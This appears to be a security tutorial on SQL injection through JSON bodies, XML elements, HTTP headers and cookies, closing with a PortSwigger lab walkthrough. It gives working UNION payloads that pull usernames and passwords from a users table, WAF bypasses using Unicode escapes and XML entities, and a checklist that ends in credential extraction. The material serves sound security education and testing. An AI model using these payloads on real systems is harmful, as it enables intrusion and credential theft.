<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/80a6981b-712e-4444-b7c0-bb5317bf1c99" />

# The basic idea

We are used to seeing **SQL Injection** in **query string parameters** (like `?id=1`) or in forms.
But the truth is any **input** sent by the user and later converted into a **SQL query** can be an entry point for the attack.

Meaning:

* It could be in a **JSON request**.
* It could be in an **XML request**.
* It could be in **HTTP headers** (like `User-Agent`).
* It could be in **cookies**.

**The idea:** anything the server reads and uses inside a **SQL query** → can potentially be injected if there are no **parameterized queries** or proper validation.

---

# 1) SQLi inside JSON (Body-based APIs)

## Why it happens?

Many backends (Node/Express, Python/Flask, PHP/Laravel… etc.) take JSON from the client and build a query with it. If the developer inserts the value directly into a string instead of using **prepared statements** → there is a risk of SQLi.

## How to detect?

1. **Arithmetic probe**: change a number to `1+1` and see if the result changes.
2. **Quote probe**: try `'` or `"` and notice errors/odd behavior.
3. **Boolean probe**: try `AND 1=1` / `AND 1=2` and observe response differences.
4. **Time-based**: try `SLEEP(3)`, `pg_sleep(3)`, `DBMS_LOCK.SLEEP(3)`… depending on the DB.

## Simple example

Normal request:

```http
POST /api/product/details
Content-Type: application/json

{"id":"5"}
```

If the server query is like:

```sql
SELECT name,price FROM products WHERE id = '<JSON.id>';
```

Try:

```json
{"id":"5 OR 1=1"}
```

Or if it's treated as a numeric expression:

```json
{"id":"1+1"}
```

## UNION (if the query results are returned in the response)

1. Determine **number of columns** with `UNION SELECT NULL,...`
2. Match **data types** (if a column is textual try "text").
3. Explore schema (optional): `information_schema.tables/columns`
4. Extract sensitive data (e.g., from `users`).

### UNION example (PostgreSQL/SQLite/Oracle concatenation)

```json
{"id":"1 UNION SELECT username || '~' || password FROM users"}
```

### UNION example (MySQL)

```json
{"id":"1 UNION SELECT CONCAT(username,'~',password) FROM users"}
```

## Common WAF bypasses in JSON

* **Unicode escapes**: write `SELECT` like: `\u0053ELECT`
* **URL-encode** parts of the payload (if the gateway decodes before the WAF).
* **Keyword splitting** (if the parser allows): `S/**/ELECT`, `UNI/**/ON`.

> **Note:** The actual effect depends on the stack (Proxy → WAF → App). Try different encodings.

---

# 2) SQLi inside XML

## Why it happens?

SOAP/legacy APIs or even REST can accept XML. Any element/attribute can end up in a query.

## Quick detection

* Replace a numeric element with `1+1`.
* Try `'` or `--` and look for errors.
* Try boolean/time payloads.

## Examples

Legitimate request:

```xml
<stockCheck>
  <productId>3</productId>
  <storeId>1</storeId>
</stockCheck>
```

Arithmetic test:

```xml
<stockCheck>
  <productId>3</productId>
  <storeId>1+1</storeId>
</stockCheck>
```

### UNION + Concatenation (if only one column is returned)

* **PostgreSQL/Oracle/SQLite**:

```xml
<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
```

* **MySQL**:

```xml
<storeId>1 UNION SELECT CONCAT(username,'~',password) FROM users</storeId>
```

## Strong WAF bypass in XML

* **XML entities**: instead of `SELECT` write `&#x53;ELECT` (S = 0x53)
* **Hackvertor (Burp)**: convert the payload to `hex_entities/dec_entities`:

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

The server will decode the encoding before SQL → often bypasses keyword filtering.

---

# 3) SQLi inside HTTP Headers

## Why it happens?

Some systems log headers into a DB, or build reports/queries using them (e.g., `User-Agent`, `X-Forwarded-For`). If the value gets used in a query without sanitization → SQLi risk.
**Often this is Second-Order SQLi**: the header gets stored now and later used in a dangerous query in a reports page/admin panel.

## Detection

* Send a request with a probing `User-Agent`:

```
User-Agent: Mozilla' AND 1=1--
```

If there is no immediate difference, monitor **reports/log pages** or any place where those values get displayed/processed later.

## UNION extraction example (if a report returns results)

```
User-Agent: test' UNION SELECT username||':'||password FROM users--
```

Or for MySQL:

```
User-Agent: test' UNION SELECT CONCAT(username,':',password) FROM users--
```

> **Tip:** Watch logs/reports that show headers. That's the essence of **Second-Order SQLi**.

---

# 4) SQLi inside Cookies

## Why it happens?

Apps store state/preferences/filters in cookies, then build queries using them. If the developer reads cookie values and puts them directly into SQL → danger.

## Detection

* Change cookie values to contain probes:

```
Cookie: prefs=1+1
Cookie: prefs=' OR '1'='1
```

* Observe result differences or errors.

## UNION (if results are reflected in the page)

* Same methodology: count columns, match types, extract from `information_schema` if needed, then extract target data.

## Bypass

* If cookie is base64-encoded, modify the decoded value (re-encode after modification).
* Use URL-encoding/Unicode escapes depending on the pipeline.

---

# Notes per DB type

**Concatenation**

* PostgreSQL/Oracle/SQLite: `a || '~' || b`
* MySQL/MariaDB: `CONCAT(a,'~',b)`
* SQL Server: `a + '~' + b` (with CAST to text if needed)

**Time-based**

* MySQL: `SLEEP(5)`
* PostgreSQL: `pg_sleep(5)`
* Oracle: `DBMS_LOCK.SLEEP(5)`
* SQL Server: `WAITFOR DELAY '0:0:5'`

**Quick DB fingerprint**

* Try DB-specific functions/queries (e.g., `SELECT @@version` in SQL Server/MySQL, `SELECT version()` in Postgres, `SELECT * FROM v$version` in Oracle) — *if the output is visible*.

---

# Quick methodology (Checklist)

1. **Confirm injection**: arithmetic/quote/boolean/time.
2. **Union path** (if results are shown):

   * Count columns with `UNION SELECT NULL,...`
   * Match types.
   * Explore schema (optional): `information_schema.tables/columns`.
   * Extract target (users/creds).
   * If only one column: use concatenation.
3. **Blind path** (if results are not shown):

   * Boolean-based (true/false)
   * Time-based (delay)
   * OAST (if available)
4. **Bypass filters/WAF**:

   * Encodings (Unicode/URL/XML entities/Base64…)
   * Keyword splitting / case / whitespace.
5. **Second-order**: look for inputs that get stored and later read (headers/cookies/profile fields).

---

# Applied example :

**Lab: SQL injection with filter bypass via XML encoding (PortSwigger)**

* The input was **XML**, and the input was evaluated inside SQL (confirmed with `1+1`).
* A plain `UNION SELECT` attempt was blocked by the **WAF**.
* We bypassed it using **XML entities / Hackvertor** to encode `UNION SELECT` so the server decodes it and the SQL engine receives it.
* The original query returned **one column** → we used **concatenation** (`username || '~' || password` or `CONCAT(...)`) to return both values in one column.
* We extracted the admin credentials → logged in → lab solved.

This shows how the same methodology applies to any **context** other than the query string:

* **Identify the injection point**
* **Test and confirm execution**
* **Choose Union/Blind path depending on response**
* **Bypass filters using encodings appropriate to the context**
* **Extract the target**, considering column/type constraints

